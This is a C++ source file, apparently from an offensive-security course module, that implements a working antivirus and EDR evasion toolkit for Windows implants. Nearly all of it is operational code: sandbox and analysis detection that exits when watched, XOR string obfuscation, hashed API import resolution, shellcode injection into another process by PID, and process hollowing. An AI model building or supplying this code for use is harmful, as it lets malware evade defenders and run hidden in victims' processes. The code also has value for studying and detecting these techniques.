/*
  av_evader.cpp — Module 08 workable (AV/EDR Evasion Toolkit)
  ============================================================
  Combines all evasion techniques used by full_stub.cpp into a single
  operational toolkit.  Demonstrates what goes inside a real implant.

  Compile:
    g++ -std=c++17 -O2 -s -o av_evader.exe av_evader.cpp -ladvapi32

  Commands:
    av_evader.exe check                    full sandbox gate (exits if sandbox)
    av_evader.exe obfstr <string>          emit compile-time ObfStr code
    av_evader.exe apihash <dll> <func>     DJB2 hash for API import hiding
    av_evader.exe resolve <dll> <hash>     resolve export by DJB2 hash
    av_evader.exe inject <pid> <sc.bin>    shellcode injection demo
    av_evader.exe hollow <pid> <exe>       basic process hollowing demo
*/
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <stdio.h>
#include <stdint.h>
#include <string>
#include <vector>
#include <cmath>
#include <fstream>

// ── compile-time ObfStr (XOR key 0x5A) ───────────────────────────────────────
template<size_t N> struct ObfStr {
    char data[N];
    constexpr ObfStr(const char (&s)[N]):data{}{for(size_t i=0;i<N;i++)data[i]=s[i]^0x5A;}
    std::string d()const{std::string o(data,N-1);for(char&c:o)c^=0x5A;return o;}
};

// ── sandbox detection ─────────────────────────────────────────────────────────
static int sandboxScore(){
    int s=0;
    SYSTEM_INFO si{}; GetSystemInfo(&si);
    if(si.dwNumberOfProcessors<2)         s+=30;
    if(GetTickCount64()<5ULL*60*1000)     s+=20;
    if(GetSystemMetrics(SM_CXSCREEN)<800) s+=20;
    char user[128]{}; DWORD ul=sizeof(user); GetUserNameA(user,&ul);
    std::string u(user); for(auto&c:u)c=(char)tolower(c);
    const char*bad[]={"sandbox","malware","virus","analyst","sample",nullptr};
    for(int i=0;bad[i];++i) if(u.find(bad[i])!=std::string::npos) s+=20;
    int r[4]{}; __cpuid(r,1); if((r[2]>>31)&1) s+=20;
    return s;
}

static bool sleepAccelerated(){
    LARGE_INTEGER f,t0,t1;
    QueryPerformanceFrequency(&f);
    QueryPerformanceCounter(&t0); Sleep(3000); QueryPerformanceCounter(&t1);
    return ((double)(t1.QuadPart-t0.QuadPart)/f.QuadPart)<1.5;
}

static void cmdCheck(){
    printf("=== Sandbox Gate ===\n");
    SYSTEM_INFO si{}; GetSystemInfo(&si);
    bool cpu   = si.dwNumberOfProcessors < 2;
    bool uptime= GetTickCount64() < 5ULL*60*1000;
    bool screen= GetSystemMetrics(SM_CXSCREEN) < 800;
    int cr[4]{}; __cpuid(cr,1); bool hv=(cr[2]>>31)&1;
    bool accel = sleepAccelerated();
    printf("  CPU count < 2      : %s\n", cpu   ?"[SANDBOX]":"[OK]");
    printf("  Uptime < 5min      : %s\n", uptime?"[SANDBOX]":"[OK]");
    printf("  Screen < 800px     : %s\n", screen?"[SANDBOX]":"[OK]");
    printf("  Hypervisor bit     : %s\n", hv    ?"[SANDBOX]":"[OK]");
    printf("  Sleep acceleration : %s\n", accel ?"[SANDBOX]":"[OK]");
    int score=sandboxScore();
    printf("\nScore: %d/100 — %s\n", score,
           score>=50?"ABORT (sandbox)":score>=20?"SUSPICIOUS":"CLEAN");
    if(score>=50||accel){printf("\n[!] Aborting — sandbox detected.\n"); ExitProcess(0);}
}

// ── obfstr generator ──────────────────────────────────────────────────────────
static void cmdObfstr(const char* s){
    std::string str(s);
    printf("// Compile-time ObfStr for: \"%s\"\n",s);
    printf("// Add template once:\n");
    printf("template<size_t N>struct ObfStr{\n");
    printf("  char data[N];\n");
    printf("  constexpr ObfStr(const char(&s)[N]):data{}{for(size_t i=0;i<N;i++)data[i]=s[i]^0x5A;}\n");
    printf("  std::string d()const{std::string o(data,N-1);for(char&c:o)c^=0x5A;return o;}\n");
    printf("};\n\n");
    printf("// Declare:\n");
    printf("constexpr ObfStr OB_STR(\"%s\");\n\n",s);
    printf("// Encoded bytes that appear in .rdata (key=0x5A):\n// { ");
    for(size_t i=0;i<str.size();++i) printf("0x%02X%s",(uint8_t)(str[i]^0x5A),i+1<str.size()?",":"");
    printf(" }\n");
}

// ── DJB2 API hashing ──────────────────────────────────────────────────────────
static uint32_t djb2(const char* s){uint32_t h=5381;while(*s)h=((h<<5)+h)^(uint8_t)*s++;return h;}

static void cmdApihash(const char* dll, const char* func){
    printf("DJB2(\"%s\") = 0x%08X\n",func,djb2(func));
    printf("DJB2(\"%s\") = 0x%08X\n",dll,djb2(dll));
    printf("\n// Use in stub:\n// FARPROC fn = resolveExport(\"%s\", 0x%08X);\n",dll,djb2(func));
}

static FARPROC resolveExport(const char* dll, uint32_t hash){
    HMODULE hm=LoadLibraryA(dll); if(!hm) return nullptr;
    auto* base=(const uint8_t*)hm;
    auto* dos=(IMAGE_DOS_HEADER*)base;
    auto* nth=(IMAGE_NT_HEADERS*)(base+dos->e_lfanew);
    auto* dir=&nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if(!dir->VirtualAddress) return nullptr;
    auto* exp=(IMAGE_EXPORT_DIRECTORY*)(base+dir->VirtualAddress);
    auto* names=(DWORD*)(base+exp->AddressOfNames);
    auto* funcs=(DWORD*)(base+exp->AddressOfFunctions);
    auto* ords=(WORD*)(base+exp->AddressOfNameOrdinals);
    for(DWORD i=0;i<exp->NumberOfNames;++i){
        const char* nm=(const char*)(base+names[i]);
        if(djb2(nm)==hash) return (FARPROC)(base+funcs[ords[i]]);
    }
    return nullptr;
}

static void cmdResolve(const char* dll, const char* hashHex){
    uint32_t h=(uint32_t)strtoul(hashHex,nullptr,16);
    FARPROC fn=resolveExport(dll,h);
    printf("0x%08X in %-20s -> %s\n",h,dll,fn?"FOUND":"NOT FOUND");
    if(fn) printf("  Address: %p\n",(void*)fn);
}

// ── shellcode injection (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread) ──
static void cmdInject(DWORD pid, const char* scFile){
    std::ifstream f(scFile,std::ios::binary);
    if(!f){fprintf(stderr,"Cannot open %s\n",scFile);return;}
    std::vector<uint8_t> sc((std::istreambuf_iterator<char>(f)),{});
    f.close();
    printf("[*] Injecting %zu bytes into PID %lu\n",sc.size(),pid);

    HANDLE hp=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
    if(!hp){fprintf(stderr,"OpenProcess failed: %lu\n",GetLastError());return;}

    LPVOID remote=VirtualAllocEx(hp,0,sc.size(),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    if(!remote){fprintf(stderr,"VirtualAllocEx failed\n");CloseHandle(hp);return;}

    SIZE_T written=0;
    WriteProcessMemory(hp,remote,sc.data(),sc.size(),&written);
    printf("[*] Wrote %zu/%zu bytes\n",written,sc.size());

    HANDLE ht=CreateRemoteThread(hp,0,0,(LPTHREAD_START_ROUTINE)remote,0,0,0);
    if(ht){printf("[+] Remote thread created: %p\n",(void*)ht);CloseHandle(ht);}
    else  printf("[-] CreateRemoteThread failed: %lu\n",GetLastError());

    CloseHandle(hp);
}

// ── process hollowing demo ────────────────────────────────────────────────────
// Spawns target suspended, maps payload PE over it, resumes.
// Educational — demonstrates the concept; payload must be same arch.
static void cmdHollow(DWORD srcPid, const char* payloadExe){
    // Read payload
    HANDLE hf=CreateFileA(payloadExe,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
    if(hf==INVALID_HANDLE_VALUE){fprintf(stderr,"Cannot open %s\n",payloadExe);return;}
    LARGE_INTEGER sz{}; GetFileSizeEx(hf,&sz);
    std::vector<uint8_t> pe((size_t)sz.QuadPart);
    DWORD rd=0; ReadFile(hf,pe.data(),(DWORD)pe.size(),&rd,0); CloseHandle(hf);
    if(pe.size()<0x40||*(uint16_t*)pe.data()!=0x5A4D){fprintf(stderr,"Not a PE\n");return;}

    // Get target process path
    char path[MAX_PATH]={};
    HANDLE hp=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,srcPid);
    if(!hp){fprintf(stderr,"Cannot open source PID %lu\n",srcPid);return;}
    GetModuleFileNameExA(hp,0,path,MAX_PATH); CloseHandle(hp);
    printf("[*] Hollow: spawn %s suspended\n",path);

    STARTUPINFOA si{sizeof(si)}; PROCESS_INFORMATION pi{};
    if(!CreateProcessA(path,0,0,0,FALSE,CREATE_SUSPENDED,0,0,&si,&pi)){
        fprintf(stderr,"CreateProcess failed: %lu\n",GetLastError()); return;
    }
    printf("[+] Target PID: %lu  TID: %lu\n",pi.dwProcessId,pi.dwThreadId);

    // Get context to find EP
    CONTEXT ctx{}; ctx.ContextFlags=CONTEXT_FULL;
    GetThreadContext(pi.hThread,&ctx);

    // Unmap and write payload
    auto* dos=(IMAGE_DOS_HEADER*)pe.data();
    auto* nth=(IMAGE_NT_HEADERS*)(pe.data()+dos->e_lfanew);
    LPVOID base=(LPVOID)(uintptr_t)nth->OptionalHeader.ImageBase;

    // Unmap (NtUnmapViewOfSection via dynamic resolve)
    typedef NTSTATUS(WINAPI*NtUVoS_t)(HANDLE,PVOID);
    auto NtUVoS=(NtUVoS_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtUnmapViewOfSection");
    if(NtUVoS) NtUVoS(pi.hProcess,base);

    LPVOID remote=VirtualAllocEx(pi.hProcess,base,nth->OptionalHeader.SizeOfImage,
                                  MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    if(!remote){
        TerminateProcess(pi.hProcess,1);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
        fprintf(stderr,"VirtualAllocEx failed\n"); return;
    }

    // Write headers
    WriteProcessMemory(pi.hProcess,remote,pe.data(),nth->OptionalHeader.SizeOfHeaders,0);
    // Write sections
    auto* sec=IMAGE_FIRST_SECTION(nth);
    for(WORD i=0;i<nth->FileHeader.NumberOfSections;++i){
        if(!sec[i].SizeOfRawData) continue;
        WriteProcessMemory(pi.hProcess,(uint8_t*)remote+sec[i].VirtualAddress,
                           pe.data()+sec[i].PointerToRawData,sec[i].SizeOfRawData,0);
    }
    // Fix EP in context
#ifdef _WIN64
    ctx.Rcx=(DWORD64)((uint8_t*)remote+nth->OptionalHeader.AddressOfEntryPoint);
#else
    ctx.Eax=(DWORD)((uint8_t*)remote+nth->OptionalHeader.AddressOfEntryPoint);
#endif
    SetThreadContext(pi.hThread,&ctx);
    ResumeThread(pi.hThread);
    printf("[+] Hollowed and resumed.\n");
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
}

// ── main ─────────────────────────────────────────────────────────────────────
int main(int argc, char* argv[]){
    if(argc<2){
        puts("av_evader — Module 08 workable\n"
             "  check                     sandbox gate (aborts if detected)\n"
             "  obfstr <string>           emit compile-time ObfStr code\n"
             "  apihash <dll> <func>      DJB2 hash for API import hiding\n"
             "  resolve <dll> <hash_hex>  resolve export by DJB2 hash\n"
             "  inject  <pid> <sc.bin>    shellcode injection (VirtualAllocEx+CRT)\n"
             "  hollow  <src_pid> <exe>   process hollowing (spawn suspended + overwrite)");
        return 1;
    }
    std::string cmd(argv[1]);
    if     (cmd=="check")              cmdCheck();
    else if(cmd=="obfstr"  &&argc>=3)  cmdObfstr(argv[2]);
    else if(cmd=="apihash" &&argc>=4)  cmdApihash(argv[2],argv[3]);
    else if(cmd=="resolve" &&argc>=4)  cmdResolve(argv[2],argv[3]);
    else if(cmd=="inject"  &&argc>=4)  cmdInject((DWORD)atoi(argv[2]),argv[3]);
    else if(cmd=="hollow"  &&argc>=4)  cmdHollow((DWORD)atoi(argv[2]),argv[3]);
    else {fprintf(stderr,"Unknown command\n");return 1;}
    return 0;
}
